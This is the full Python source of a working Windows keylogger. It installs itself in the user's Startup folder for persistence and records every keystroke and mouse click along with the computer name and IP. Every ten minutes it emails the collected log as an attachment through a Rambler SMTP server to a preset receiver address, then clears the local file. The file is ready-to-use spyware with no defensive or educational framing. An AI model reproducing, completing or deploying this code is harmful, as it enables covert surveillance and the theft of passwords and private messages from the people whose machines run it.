import time, smtplib, os, threading, shutil, sys, socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
from pynput.mouse import Listener

User = os.getenv("USERNAME")
FilePath = f'C:\\Users\\{User}\\AppData\\Local\\Temp\\tempr.txt'

#Add the executable to startup
if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

def CreateFile():
    open(FilePath, "a")

#Write the collected keys in the file
def WriteFile(Key):
    with open(FilePath, "a") as f:
        time_now = time.ctime()
        f.write(str(time_now) + " - Key -> " + str(Key) + "\n")
 
#Collect the pressed key and write the key in a file
def GetKey(PressedKey):
    try:
        Key = str(PressedKey.char)
    except AttributeError:
        if PressedKey == PressedKey.space:
            Key = "Space"
        elif PressedKey == PressedKey.esc:
            Key = "ESC"
        else:
            Key = str(PressedKey)
    WriteFile(Key)

#Collect the pressed mouseclick and write the click in a file
def GetMouseClick(x,y,button,pressed):
    if pressed:
        WriteFile(f"{button} Pressed X = {x} Y = {y}")
    elif not pressed:
        WriteFile(f"{button} Realeased X = {x} Y = {y}")

#Collect the pressed keys with a listener and calls SendEMail
def CatchKey():
    with Listener(on_click=GetMouseClick) as MouseListener:
        with keyboard.Listener(on_press=GetKey) as KeybordListener:
            SendEMail()
            KeybordListener.join()
        MouseListener.join()

#Collect Info from PC (IP and PC Name)
def PCInfo():
    pcname = socket.gethostname()
    ip = socket.gethostbyname(pcname)
    with open(FilePath, "a") as f:     
        f.write(f"Computer Name: {pcname}\t IP: {ip}\n")
 
#Create a new thread that with the chosen time will call MakeEmail and erase the information in txt file to send the new keys
def SendEMail():
    Time = 600 #Time is in seconds(10 min) 
    MakeEMail('emailSender@rambler.ru', 'PassWord Here', 'emailReceiver@rambler.ru', FilePath)
    with open(FilePath, "r+") as f:
        f.truncate(0)
        
    PCInfo()
    
    timer = threading.Timer(Time, SendEMail) 
    timer.start()
    
#Make the email with the collected information
#Uses Rambler ru as email
def MakeEMail(EmailSender, Password, EmailReceiver, UpLoadFilePath):
    msg = MIMEMultipart()
    msg['From'] = EmailSender
    msg['To'] = EmailReceiver
    msg['Subject'] = 'KeyLogger'
    msg.attach(MIMEText('Info', 'plain'))
    
    filename = os.path.basename(UpLoadFilePath)
    attachment = open(UpLoadFilePath, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    
    server = smtplib.SMTP_SSL('smtp.rambler.ru', 465)
    server.login(EmailSender, Password)
    server.sendmail(EmailSender, EmailReceiver, msg.as_string())
    server.quit()

def Run():
    CreateFile()
    while True:
        CatchKey()
        
Run()
